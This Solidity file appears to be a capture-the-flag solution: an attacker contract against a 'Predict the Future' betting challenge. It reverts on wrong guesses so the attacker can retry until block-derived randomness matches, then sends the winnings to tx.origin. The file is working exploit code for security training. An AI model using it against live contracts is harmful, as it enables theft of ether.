pragma solidity ^0.4.21;

/// @notice Interface to interact with the challenge contract
interface IPredictTheFutureChallenge {
    function isComplete() external view returns (bool);
    function lockInGuess(uint8 n) external payable;
    function settle() external;
}

/// @title Attacker contract for PredictTheFutureChallenge
contract PredictTheFutureAttacker {
    IPredictTheFutureChallenge public challenge;

    /// @dev Stores challenge address during deployment
    function PredictTheFutureAttacker(address _challenge) public payable {
        challenge = IPredictTheFutureChallenge(_challenge);
    }

    /// @dev Locks in a guess from this contract
    function lockGuess(uint8 guessValue) public payable {
        require(address(this).balance >= 1 ether);
        challenge.lockInGuess.value(1 ether)(guessValue);
    }

    /// @dev Attempts to settle the prediction and withdraws funds if successful
    function attack() public payable {
        challenge.settle();

        require(challenge.isComplete());

        // Return the balance to the EOA who deployed the attacker
        tx.origin.transfer(address(this).balance);
    }

    /// @dev Allow contract to receive ETH
    function() public payable {}
}
